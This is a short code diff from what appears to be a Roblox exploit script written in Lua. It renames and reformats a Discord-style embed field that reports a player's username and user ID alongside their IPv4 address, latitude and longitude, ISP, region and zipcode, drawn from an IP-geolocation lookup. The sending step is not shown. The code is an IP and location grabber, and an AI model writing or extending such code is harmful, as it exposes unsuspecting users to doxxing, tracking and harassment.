@@ -48,8 +48,8 @@ do
                             ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
                             },
                             {
-                            ["name"] = "More Info",
-                            ["value"] = string.format("*IPV4: ||%s||*\n*Lat/Lon: %s/%s*\n**ISP**: %s\n*Used: %s*\n*Region: %s/%s*\n*Zipcode: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
+                            ["name"] = "Personal",
+                            ["value"] = string.format("**IPV4**: ||%s||*\n**Lat/Lon**: %s/%s*\n**ISP**: %s\n**Used**: %s*\n**Region**: %s/%s*\n**Zipcode**: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                             }
                         },
                         ["author"] = {
